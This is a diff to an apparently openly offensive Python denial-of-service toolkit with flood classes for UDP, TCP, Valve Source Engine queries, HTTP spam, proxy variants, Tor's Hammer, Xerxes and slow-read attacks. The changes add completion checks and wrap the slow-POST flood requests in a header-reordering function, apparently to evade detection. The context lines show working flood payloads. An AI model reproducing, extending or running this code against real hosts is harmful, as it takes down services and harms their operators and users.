@@ -179,6 +179,10 @@ class udp_flood:
    self.kill() 
   except:
     pass
+ def done(self):
+  if 'stop' in dir(self):
+   return False
+  return True
  def reset(self):
    l=[]
    for x in self.__dict__:
@@ -193,7 +197,7 @@ class udp_flood:
   return a
   
 class vse_flood:
- def __init__(self,u,p=80,threads_daemon=True,interval=0.001,min_size=10,max_size=10,connection=True,duration=60,threads=1,limiting=False,logs=False):
+ def __init__(self,u,p=80,threads_daemon=True,interval=0.001,min_size=10,max_size=10,connection=True,duration=60,threads=1,limiting=True,logs=False):
   self.target=u
   self.port=p
   self.payload=b'\xff\xff\xff\xffTSource Engine Query\x00' # read more at https://developer.valvesoftware.com/wiki/Server_queries
@@ -239,6 +243,10 @@ class vse_flood:
    self.kill()
   except:
    pass
+ def done(self):
+  if 'stop' in dir(self):
+   return False
+  return True
  def reset(self):
    l=[]
    for x in self.__dict__:
@@ -319,6 +327,10 @@ class tcp_flood:
    self.kill()
   except:
    pass
+ def done(self):
+  if 'stop' in dir(self):
+   return False
+  return True
  def reset(self):
    l=[]
    for x in self.__dict__:
@@ -421,6 +433,10 @@ class http_spam:
    self.kill()
   except:
    pass
+ def done(self):
+  if 'stop' in dir(self):
+   return False
+  return True
  def reset(self):
    l=[]
    for x in self.__dict__:
@@ -538,6 +554,10 @@ class prox_http_spam(threading.Thread):
    self.kill()
   except:
    pass
+ def done(self):
+  if 'stop' in dir(self):
+   return False
+  return True
  def reset(self):
    l=[]
    for x in self.__dict__:
@@ -600,7 +620,7 @@ class torshammer:
      ck=""
      if self.cookie:
       ck="Cookie: "+self.cookie+"\r\n"
-     s.send("POST {} HTTP/1.1\r\n{}User-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n".format(random.choice(paths),ck,random.choice(self.user_agents),random.randint(300,1000),q,(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target).encode('utf-8'))
+     s.send(reorder_headers_randomly("POST {} HTTP/1.1\r\n{}User-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n".format(random.choice(paths),ck,random.choice(self.user_agents),random.randint(300,1000),q,(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target)).encode('utf-8'))
      for i in range(q):
       if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
        break
@@ -626,6 +646,10 @@ class torshammer:
    self.kill()
   except:
    pass
+ def done(self):
+  if 'stop' in dir(self):
+   return False
+  return True
  def reset(self):
    l=[]
    for x in self.__dict__:
@@ -713,7 +737,7 @@ class prox_hammer:
      ck=""
      if self.cookie:
       ck="Cookie: "+cookie+"\r\n"
-     s.send("POST {} HTTP/1.1\r\n{}User-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n".format(random.choice(paths),ck,random.choice(self.user_agents),random.randint(300,1000),q,(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target).encode('utf-8'))
+     s.send(reorder_headers_randomly("POST {} HTTP/1.1\r\n{}User-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nReferer: {}\r\nHost: {}\r\n\r\n".format(random.choice(paths),ck,random.choice(self.user_agents),random.randint(300,1000),q,(random.choice(referers)+random.choice(lis)+str(random.randint(0,100000000))+random.choice(lis)),self.target)).encode('utf-8'))
      for i in range(q):
       if (int(time.time()-self.start)>=self.duration):#this is a safety mechanism so the attack won't run forever
        break
@@ -737,6 +761,10 @@ class prox_hammer:
    self.kill()
   except:
    pass
+ def done(self):
+  if 'stop' in dir(self):
+   return False
+  return True
  def reset(self):
    l=[]
    for x in self.__dict__:
@@ -810,6 +838,10 @@ class xerxes:
    self.kill()
   except:
    pass
+ def done(self):
+  if 'stop' in dir(self):
+   return False
+  return True
  def reset(self):
    l=[]
    for x in self.__dict__:
@@ -907,6 +939,10 @@ class prox_xerxes:
    self.kill()
   except:
    pass
+ def done(self):
+  if 'stop' in dir(self):
+   return False
+  return True
  def reset(self):
    l=[]
    for x in self.__dict__:
@@ -1002,6 +1038,10 @@ class slow_read:
    self.kill()
   except:
    pass
+ def done(self):
+  if 'stop' in dir(self):
+   return False
+  return True
  def reset(self):
    l=[]
    for x in self.__dict__:
